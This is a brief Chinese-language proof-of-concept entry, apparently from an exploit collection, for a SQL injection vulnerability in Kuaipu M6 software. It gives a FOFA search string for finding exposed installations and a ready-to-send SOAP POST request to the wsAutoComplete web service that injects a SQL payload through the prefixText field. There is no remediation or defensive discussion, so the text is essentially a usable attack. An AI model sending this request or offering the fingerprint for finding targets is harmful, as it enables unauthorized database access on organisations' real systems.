## 快普M6存在sql注入漏洞


## fofa

```
body="Resource/JavaScript/jKPM6.DateTime.js"
```

## poc

```
POST /WebService/wsAutoComplete.asmx HTTP/1.1
Host:
Content-Type: application/soap+xml;charset=UTF-8;action="http://tempuri.org/GetAccountTitleList"

<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
   <soap:Header/>
   <soap:Body>
      <tem:GetAccountTitleList>
         <!--Optional:-->
         <tem:prefixText>'-1/user--</tem:prefixText>
         <tem:count>1</tem:count>
      </tem:GetAccountTitleList>
   </soap:Body>
</soap:Envelope>
```
